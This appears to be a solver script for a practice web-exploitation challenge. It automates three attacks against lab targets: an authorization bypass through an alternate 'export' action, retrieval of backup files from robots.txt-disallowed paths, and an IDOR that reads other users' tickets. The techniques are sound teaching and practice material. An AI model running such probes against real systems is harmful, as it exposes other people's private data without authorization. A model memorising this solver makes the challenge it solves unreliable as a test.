#!/usr/bin/env python3
"""Solver for web-exploitation-day-14-the-api-has-opinions.

Mastery for this family mixes THREE distinct bug classes behind differently
themed apps; classify each target independently rather than assuming the
challenge's own name/prompt. All three were observed live on 2026-10-24
(release day 24), one target each in a 3-target mastery set:

1. "WAR Room" (Jakarta Servlet/Tomcat skin) - broken function-level / field-
   level authorization in a generic "execute" endpoint. /api/clues discloses
   feature_route + inventory_route + protected_reference; /api/inventory
   lists the (fields, actions) grid for that endpoint. A "public_reference"
   id with action=view works for any field; the protected id rejects
   action=view for the restricted field ({"error":"field_action_forbidden"}),
   but a *different* action (export) is not subject to the same check and
   leaks the restricted field + proof.
   -> solve_war_room()

2. "Service Postcard" (tiny Node.js status page) - backup-file exposure. The
   root page hints at a hidden path (an HTML comment about reviewing crawler
   policy); /robots.txt Disallows a directory that is reachable anyway and
   serves a directory index with a .bak/.json backup file containing the
   proof. This is the restored "backup exposure" class from recovery_lib.py,
   reachable via robots.txt instead of a linked backup/ path.
   -> solve_backup_exposure()

3. "Case Crate" (incident-ticket app) - IDOR. The dashboard only shows the
   logged-in user's own ticket ids, but /api/timeline (a session cookie is
   auto-issued on first request, no login needed) leaks OTHER users' case
   ids with visibility:"reference_only". /api/tickets/<id> has no ownership
   check, so fetching the leaked id directly returns its proof.
   -> solve_idor_timeline()

classify_and_solve() tries each in turn based on what the target actually
discloses (never guesses from the family's own prompt) and returns the first
match; raises if none of the three known classes fit, which is itself a
signal to add a new class here rather than hardcode around it.

Usage: python3 solve.py <target_base_url>
Prints the recovered proof to stdout; evidence (bug class + details) to stderr.
"""
import json
import re
import sys
import urllib.error
import urllib.request
import http.cookiejar

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30


def _opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def get_json(url, opener=None):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with (opener.open(req, timeout=TIMEOUT) if opener
              else urllib.request.urlopen(req, timeout=TIMEOUT)) as r:
            body = r.read().decode("utf-8", "replace")
            status = r.status
    except urllib.error.HTTPError as e:
        return e.code, _try_json(e.read().decode("utf-8", "replace"))
    return status, _try_json(body)


def _try_json(body):
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return {"raw": body}


def get_text(url, opener=None):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with (opener.open(req, timeout=TIMEOUT) if opener
              else urllib.request.urlopen(req, timeout=TIMEOUT)) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def solve_war_room(base, clues):
    """Field/action authorization bypass on a generic "execute" endpoint."""
    feature_route = clues["feature_route"]
    inventory_route = clues.get("inventory_route", "/api/inventory")
    protected_id = clues["protected_reference"]

    status, inv = get_json(f"{base}{inventory_route}")
    if status != 200:
        raise RuntimeError(f"{inventory_route} failed: {status} {inv}")

    fields = inv.get("fields", ["title", "note"])
    actions = inv.get("actions", ["view", "export"])
    qp_names = inv.get("query_parameters", ["id", "fields", "action"])
    id_param, fields_param, action_param = (qp_names + ["id", "fields", "action"])[:3]

    for field in fields:
        for action in actions:
            url = (f"{base}{feature_route}?{id_param}={protected_id}"
                   f"&{fields_param}={field}&{action_param}={action}")
            status, body = get_json(url)
            if status == 200 and isinstance(body, dict) and "evidence" in body:
                return body["evidence"], {
                    "class": "field_action_authz_bypass",
                    "feature_route": feature_route,
                    "field": field,
                    "action": action,
                    "id": protected_id,
                }
    raise RuntimeError("no (field, action) combination bypassed authorization")


def solve_backup_exposure(base):
    """robots.txt-disclosed hidden directory -> backup file -> proof."""
    status, robots = get_text(f"{base}/robots.txt")
    if status != 200:
        return None
    disallowed = re.findall(r"Disallow:\s*(\S+)", robots)
    for path in disallowed:
        status, index_html = get_text(f"{base}{path}")
        if status != 200:
            continue
        hrefs = re.findall(r'href="([^"]+\.(?:bak|json|txt|old|zip))"', index_html)
        for href in hrefs:
            url = href if href.startswith("http") else f"{base}{path.rstrip('/')}/{href.lstrip('/')}"
            status, body = get_text(url)
            if status != 200:
                continue
            m = re.search(r"proof_[0-9a-fA-F]{16,}", body)
            if m:
                return m.group(0), {
                    "class": "backup_exposure",
                    "disallowed_path": path,
                    "file": href,
                }
    return None


def solve_idor_timeline(base):
    """Session-scoped dashboard leaks other users' object ids via a timeline/
    activity feed; the object endpoint has no ownership check."""
    opener = _opener()
    status, root = get_text(base, opener=opener)
    if status != 200:
        return None

    status, timeline = get_json(f"{base}/api/timeline", opener=opener)
    if status != 200 or not isinstance(timeline, dict) or "events" not in timeline:
        return None

    current_user = timeline.get("current_user")
    own_ids = set()
    foreign_ids = []
    for ev in timeline["events"]:
        cid = ev.get("case_id")
        if cid is None:
            continue
        if ev.get("owner") == current_user:
            own_ids.add(cid)
        else:
            foreign_ids.append(cid)

    for cid in foreign_ids:
        status, ticket = get_json(f"{base}/api/tickets/{cid}", opener=opener)
        if status == 200 and isinstance(ticket, dict):
            note = ticket.get("note", "")
            m = re.search(r"proof_[0-9a-fA-F]{16,}", note)
            if m:
                return m.group(0), {
                    "class": "idor_timeline_leak",
                    "leaked_case_id": cid,
                    "leaked_owner": ticket.get("owner"),
                }
    return None


def classify_and_solve(base):
    base = base.rstrip("/")

    status, clues = get_json(f"{base}/api/clues")
    if status == 200 and isinstance(clues, dict) and "feature_route" in clues:
        return solve_war_room(base, clues)

    result = solve_backup_exposure(base)
    if result:
        return result

    result = solve_idor_timeline(base)
    if result:
        return result

    raise RuntimeError(
        "target did not match any known bug class (war_room/backup_exposure/idor_timeline) "
        "- inspect it manually and add a new solve_* class"
    )


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <target_base_url>", file=sys.stderr)
        return 1
    proof, evidence = classify_and_solve(sys.argv[1])
    print(proof)
    print(json.dumps(evidence, indent=2), file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
